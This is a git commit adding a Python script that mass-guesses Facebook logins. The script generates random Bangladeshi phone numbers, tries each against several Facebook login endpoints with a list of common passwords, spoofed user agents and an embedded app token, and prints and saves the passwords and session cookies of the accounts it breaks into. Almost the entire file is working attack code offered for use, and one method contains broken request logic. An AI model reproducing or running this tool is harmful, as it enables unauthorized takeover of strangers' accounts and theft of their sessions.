e43dd6355c1f640ea2d7ba2c8bfe1fc5d677d831
R L RONE <tanzimrone@gmail.com>
2025-07-12 09:31:03 +0600

    Create rlrone.py

---
+++ rlrone.py
@@ -0,0 +1,253 @@
+"""user bin python3;UTF-8"""
+"""
+original written by R L RONE HACKER
+github : R L RONE HACKER
+"""
+#═══════════| 𝙸𝙼𝙿𝙾𝚁𝚃 |══════════#
+import os
+import random
+import time
+import string
+from concurrent.futures import ThreadPoolExecutor as tred
+import requests
+import re
+import sys
+import uuid
+import json
+#══════════| 𝚄𝚂𝙴𝚁 𝙰𝙶𝙴𝙽𝚃 |══════════#
+def __fuck2__():
+	model = random.choice(["RMX2185","RMX2189","RMX2180","RMX2101","RMX3063","RMX3201","RMX3193","RMX2151","RMX3085","RMX2193"])
+	ufff = "[FBAN/FB4A;FBAV/"+str(random.randint(10,100))+'.0.0.'+str(random.randint(4000,5000))+";FBBV/"+str(random.randint(4000000,5000000))+f";[FBAN/FB4A;FBAV/365.0.0.30.112;FBBV/367653576;FBDM/"+"{density=2.25,width=720,height=1400}"+";FBLC/en_Qaau_US;FBRV/369757394;FBCR/Grameenphone;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/{model};FBSV/7.1.1;FBOP/1;FBCA/arm64-v8a:;]"
+	return ufff
+#══════════| 𝚄𝚂𝙴𝚁 𝙰𝙶𝙴𝙽𝚃 2 |══════════#	
+ugen=[]
+for x in range(1000):
+    aa='Mozilla/5.0 (Linux; Android 10;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['Redmi Note 10 Pro'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Chrome/107.0.0.0 Mobile Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+#═══════════| 𝙲𝙾𝙻𝙾𝚄𝚁 |══════════#
+green ="\033[1;32m"
+red ="\033[1;31m"
+yellow ="\033[1;33m"
+purple ="\033[1;35m"
+cyan ="\033[1;36m"
+blue ="\033[1;34m"
+black ="\033[1;30m"
+white ="\033[1;37m"
+oks=[]
+cps=[]
+loop=0
+#═══════════| 𝙻𝙾𝙶𝙾 |══════════#
+logo=(f"""{white}
+  .dP"Y8 88""Yb Yb  dP 
+  `Ybo." 88__dP  YbdP  
+  o.`Y8b 88"Yb   dPYb  
+  8bodP' 88  Yb dP  Yb  {cyan}𝚅{red}/{blue}0{red}.{blue}0
+{purple}──────────────────────────────────────────
+{purple}<{yellow}/{purple}> {green}𝙳𝙴𝚅𝙾𝙻𝙿𝙾𝙴𝚁 {purple}<{red}•{purple}> {green}𝚁 𝙻 𝚁𝙾𝙽𝙴
+{purple}<{yellow}/{purple}> {green}𝙶𝙸𝚃𝙷𝚄𝙱    {purple}<{red}•{purple}> {green}𝚁 𝙻 𝙲𝚈𝙱𝙴𝚁 𝙰𝚁𝙼𝚈
+{purple}<{yellow}/{purple}> {green}𝚂𝙴𝚁𝚅𝙸𝙲𝙴   {purple}<{red}•{purple}> {green}𝙳𝙰𝚃𝙰 & 𝚆𝙸𝙵𝙸
+{purple}<{yellow}/{purple}> {green}𝚃𝙾𝙾𝙻'𝚜    {purple}<{red}•{purple}> {green}𝚁𝙰𝙽𝙳𝙾𝙼 𝙲𝙻𝙾𝙽𝙴 
+{purple}──────────────────────────────────────────""")
+#══════════| 𝙻𝙸𝙽𝙴𝚇 𝙳𝙴𝙵 |══════════#
+def linex():
+    print("\033[1;35m──────────────────────────────────────────")   
+#══════════| 𝙲𝙻𝙴𝙰𝚁 𝙳𝙴𝙵 |══════════#
+def clear():
+    os.system('clear')
+#══════════| 𝙼𝙰𝙸𝙽 𝙳𝙴𝙵 |══════════#
+def main():
+    clear()
+    print(logo)
+    print("\033[1;30m[\033[1;37m1\033[1;30m] \033[1;32m𝚁𝙰𝙽𝙳𝙾𝙼 𝙲𝙻𝙾𝙽𝙴")
+    print("\033[1;30m[\033[1;37m2\033[1;30m] \033[1;32m𝚁𝙴𝙿𝙾𝚁𝚃 𝙱𝚄𝙶")
+    print("\033[1;30m[\033[1;37m0\033[1;30m] \033[1;32m𝙴𝚇𝙸𝚃")
+    linex()
+    mrx = input(f"\033[1;35m<\033[1;33m/\033[1;35m> \033[1;32m𝙲𝙷𝙾𝙸𝙲𝙴 𝙰𝙽 𝙾𝙿𝚃𝙸𝙾𝙽\033[1;31m :\033[1;32m ")
+    if mrx in ["1","01","a","A"]:bd_sex()
+    elif mrx in ["2","02","b","B"]:os.system("xdg-open https://t.me/V3rson_infinity1144");time.sleep(2);main()
+    else:
+        exit(".. 𝙳𝙾𝙽𝙴 𝙴𝚇𝙸𝚃 :)")
+#══════════| 𝙱𝙳 𝙲𝙻𝙾𝙽𝙴 𝙳𝙴𝙵 |══════════#
+def bd_sex():
+    user=[]
+    clear()
+    print(logo)
+    print("\033[1;35m<\033[1;33m/\033[1;35m> \033[1;32m𝙲𝙾𝙳𝙴 𝙴𝚇𝙿 \033[1;37m: \033[1;32m017 \033[1;31m/ \033[1;32m018\033[1;31m / \033[1;32m019\033[1;31m / \033[1;32m013")
+    linex()
+    code = input ("\033[1;35m<\033[1;33m/\033[1;35m> \033[1;32m𝙲𝙷𝙾𝙸𝙲𝙴\033[1;31m :\033[1;32m ")
+    linex()
+    print("\033[1;35m<\033[1;33m/\033[1;35m> \033[1;32m 𝙻𝙸𝙼𝙸𝚃 𝙴𝚇𝙿 \033[1;31m: \033[1;32m1000 \033[1;31m/ \033[1;32m2000 \033[1;31m/\033[1;32m 5000")
+    linex()
+    try:
+       limit = int(input("\033[1;35m<\033[1;33m/\033[1;35m> \033[1;32m  𝙲𝙷𝙾𝙸𝙲𝙴 : "))
+    except ValueError:
+       limit=50000
+    clear()
+    print (logo)
+    print("\033[1;35m[\033[1;33m1\033[1;35m] \033[1;32m 𝙼𝙴𝚃𝙷𝙾𝙳 𝙼1")
+    print("\033[1;35m[\033[1;33m1\033[1;35m] \033[1;32m 𝙼𝙴𝚃𝙷𝙾𝙳 𝙼2")
+    print("\033[1;35m[\033[1;33m2\033[1;35m] \033[1;32m 𝙼𝙴𝚃𝙷𝙾𝙳 𝙼3")
+    linex()
+    method_sex = input ("\033[1;35m<\033[1;33m/\033[1;35m> \033[1;32m𝙲𝙷𝙾𝙸𝙲𝙴 \033[1;31m: \033[1;32m") 
+    clear()
+    for nmbr in range(limit):
+        nmp=''.join(random.choice(string.digits) for _ in range(8))
+        user.append(nmp)
+    with tred(max_workers=30) as Djx:
+        tl=str(len(user))
+        print (logo)
+        print("\033[1;35m<\033[1;31m/\033[1;35m> \033[1;32m𝚃𝙾𝚃𝙰𝙻 𝙸𝙳 \033[1;31m:\033[1;37m "+tl)
+        print("\033[1;35m<\033[1;31m/\033[1;35m> \033[1;32m𝚂𝙸𝙼 𝙲𝙾𝙳𝙴 \033[1;31m:\033[1;37m " +code)
+        print("\033[1;35m<\033[1;31m/\033[1;35m> \033[1;32m𝙳𝙾𝙽'𝚃 𝚃𝚄𝚁𝙽 𝙾𝙽 𝙰𝙸𝚁𝙿𝙻𝙰𝙽𝙴 𝙼𝙾𝙳𝙴")
+        linex() 
+        for psx in user:
+            ids=code+psx
+            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'sadiya','jannat','mababa','135790','i love you','112233','102030','bangladesh','@@@###','@#@#@#','Bangladesh','607080','Nazmul']
+            if method_sex in ["1","01","b","B"]:Djx.submit(method_crack,ids,passlist)
+            elif method_sex in ["2", "02", "B","b"]:Djx.submit(method_crackrx7,ids,passlist)
+            else:
+                Djx.submit(method_crackxx,ids,passlist)
+#══════════| 𝙼𝙴𝚃𝙷𝙾𝙳 𝙲𝚁𝙰𝙲𝙺 |══════════#
+def method_crack(ids,passlist):
+    global oks
+    global cps
+    global loop
+    try:
+        for pas in passlist:
+            sys.stdout.write('\r\r \033[1;37m  •𝚂𝚁𝚇-𝙰𝙿𝙸• %s|\033[1;32m𝚂𝚄𝙲𝙲𝙴𝚂:%s'%(loop,len(oks)))
+            sys.stdout.flush()
+            adid=str(uuid.uuid4())
+            device_id=str(uuid.uuid4())
+            Ua = "[FBAN/MessengerLite;FBAV/301.0.0.8.106;FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/308331321;FBCR/AXIS;FBMF/vivo;FBBD/vivo;FBDV/vivo 1935;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=1.29375,width=1055,height=1666};]"
+            datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
+            header={'User-Agent': Ua, 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
+            url='https://api.facebook.com/method/auth.login'
+            reqx=requests.post(url,data=datax,headers=header).json()
+            if 'session_key' in reqx:
+                try:
+                    uid=reqx['uid']
+                except:
+                    uid=ids
+                if str(uid) in oks:
+                    break
+                else:
+                    print('\r\r \033[1;32m</> 𝚂𝚁𝚇-𝙾𝙺 '+str(uid)+' | '+pas+'\033[1;37m')
+                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
+                    print('\033[1;32m </> 𝙲𝙾𝙾𝙺𝙸𝙴 '+coki)
+                    open('/sdcard/𝚂𝚁𝚇-𝙾𝙺.txt','a').write(str(uid)+' | '+pas+'\n')
+                    oks.append(str(uid))
+                    break
+            elif 'www.facebook.com' in reqx['error_msg']:
+                print('\r\r \033[1;30m</> 𝚂𝚁𝚇-𝙲𝙿 '+ids+' | '+pas+'\033[1;37m')
+                open('/sdcard/𝚂𝚁𝚇-𝙲𝙿 .txt','a').write(ids+'|'+pas+'\n')
+                cps.append(ids)
+                break
+            else:
+                continue
+        loop+=1
+    except:
+        pass
+#══════════| 𝙼𝙴𝚃𝙷𝙾𝙳 𝙲𝚁𝙰𝙲𝙺 |══════════#
+def method_crackxx(ids,passlist):
+    global oks
+    global cps
+    global loop
+    try:
+        for pas in passlist:
+            uuu=random.choice(ugen)
+            sys.stdout.write('\r\r\033[1;37m •𝚂𝚁𝚇-𝙽𝙾𝚁𝙼𝙰𝙻• %s|\033[1;32m𝚂𝚄𝙲𝙲𝙴𝚂:%s'%(loop,len(oks)))
+            sys.stdout.flush()
+            session=requests.Session()
+            free_fb=session.get("https://free.facebook.com").text
+            datax={
+              "lsd":re.search('name="lsd" value="(.*?)"',str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"',str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"',str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"',str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":ids,
+            "password":pas,
+            "login":"Log In",}
+            header={"authority": 'www.facebook.com',"method": 'POST',"scheme": 'https',"accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',"accept-encoding": 'gzip, deflate, br',"accept-language": 'en-US,en;q=1',"cache-control": 'no-cache, no-store, must-revalidate',"referer": 'https://www.facebook.com/',"sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',"sec-ch-ua-mobile": '?0',"sec-ch-ua-platform": "Windows","sec-fetch-dest": 'document',"sec-fetch-mode": 'navigate',"sec-fetch-site": 'same-origin',"sec-fetch-user": '?1',"pragma": 'no-cache',"priority": 'u=1',"cross-origin-resource-policy": 'cross-origin',"upgrade-insecure-requests": '1',"user-agent": uuu,}
+            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100')
+            reqx=requests.post(lo,data=datax,headers=header).text                    
+            if 'session_key' in reqx:
+                try:
+                    uid=reqx['uid']
+                except:
+                    uid=ids
+                if str(uid) in oks:
+                    break
+                else:
+                    print('\r\r \033[1;32m</> 𝚂𝚁𝚇-𝙾𝙺 '+str(uid)+' | '+pas+'\033[1;37m')
+                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
+                    print('\033[1;32m </> 𝙲𝙾𝙾𝙺𝙸𝙴 '+coki)
+                    open('/sdcard/𝚂𝚁𝚇-𝙾𝙺.txt','a').write(str(uid)+' | '+pas+'\n')
+                    oks.append(str(uid))
+                    break
+            elif 'www.facebook.com' in reqx['error_msg']:
+                print('\r\r \033[1;30m</> 𝚂𝚁𝚇-𝙲𝙿 '+ids+' | '+pas+'\033[1;37m')
+                open('/sdcard/𝚂𝚁𝚇-𝙲𝙿 .txt','a').write(ids+'|'+pas+'\n')
+                cps.append(ids)
+                break
+            else:
+                continue
+        loop+=1
+    except:
+        pass            
+#══════════| 𝙼𝙴𝚃𝙷𝙾𝙳 𝙲𝚁𝙰𝙲𝙺 |══════════#
+def method_crackrx7(ids,passlist):
+    global oks
+    global cps
+    global loop
+    try:
+        for pas in passlist:
+            sys.stdout.write('\r\r \033[1;37m  •𝚂𝚁𝚇-𝙶𝚁𝙰𝙿𝙷• %s|\033[1;32m𝚂𝚄𝙲𝙲𝙴𝚂:%s'%(loop,len(oks)))
+            sys.stdout.flush()
+            adid=str(uuid.uuid4())
+            device_id=str(uuid.uuid4())
+            ua= "[FBAN/MessengerLite;FBAV/301.0.0.8.106;FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/308331321;FBCR/AXIS;FBMF/vivo;FBBD/vivo;FBDV/vivo 1935;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=1.29375,width=1055,height=1666};]"
+            datax={'adid':adid,'format':'json','device_id':device_id,'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
+            header={'User-Agent': ua,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
+            url = 'https://b-graph.facebook.com/auth/login'
+            reqx=requests.post(url,data=datax,headers=header).json()
+            if 'session_key' in reqx:
+                try:
+                    uid=reqx['uid']
+                except:
+                    uid=ids
+                if str(uid) in oks:
+                    break
+                else:
+                    print('\r\r \033[1;32m</> 𝚂𝚁𝚇-𝙾𝙺 '+str(uid)+' | '+pas+'\033[1;37m')
+                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
+                    print('\033[1;32m </> 𝙲𝙾𝙾𝙺𝙸𝙴 '+coki)
+                    open('/sdcard/𝚂𝚁𝚇-𝙾𝙺.txt','a').write(str(uid)+' | '+pas+'\n')
+                    oks.append(str(uid))
+                    break
+            elif 'www.facebook.com' in reqx['error_msg']:
+                print('\r\r \033[1;30m</> 𝚂𝚁𝚇-𝙲𝙿 '+ids+' | '+pas+'\033[1;37m')
+                open('/sdcard/𝚂𝚁𝚇-𝙲𝙿 .txt','a').write(ids+'|'+pas+'\n')
+                cps.append(ids)
+                break
+            else:
+                continue
+        loop+=1
+    except:
+        pass        
+          
+#══════════| 𝙴𝚇𝙸𝚃 |══════════#
+main()
